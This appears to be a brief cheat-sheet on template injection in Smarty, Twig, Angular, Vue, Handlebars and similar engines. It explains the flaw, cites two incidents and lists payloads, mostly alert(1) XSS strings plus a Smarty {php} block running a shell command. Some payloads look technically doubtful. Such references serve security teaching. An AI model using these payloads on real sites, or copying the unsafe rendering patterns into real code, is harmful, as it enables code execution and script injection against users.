Template Injection → XSS

What template injection is

User data lands inside server-side or client-side template syntax; engine evaluates it as code → RCE or XSS.

Why it happens

Templates treat user input as part of the template grammar (placeholders, helpers, filters) instead of pure data.

Where you’ll meet it

Server: Smarty, Twig, Jinja, Velocity, ERB. Client: AngularJS, Vue, Mustache, Handlebars. Edge: PDF templates, email composers.

Impact

Server-side RCE (Smarty {php}), client-side XSS (Angular {{}}), supply-chain back-door (see 2021 Twig RCE in Symfony).

Mini case-study

2020 Shopify Summer-of-Images app — Liquid template injection → server-side RCE → $50 000 bounty.

Payloads

// Call global constructor
{{constructor.constructor('alert(1)')()}}
// v-html renders raw HTML
<div v-html="user"></div>  // user = '<script>alert(1)</script>'
// @index gives array iterator → prototype pollution
{{@index.constructor.prototype.eval='alert(1)'}}
// If lambda is Function() → exec
{{#lambda}}alert(1){{/lambda}}
// Explicit raw HTML
<div dangerouslySetInnerHTML={{__html: user}} />
// Old Smarty allows PHP
{php}echo `id`;{/php}
// Route param written with document.write
route('/user/:name',ctx=>document.write(ctx.params.name))  // name = "<script>..."
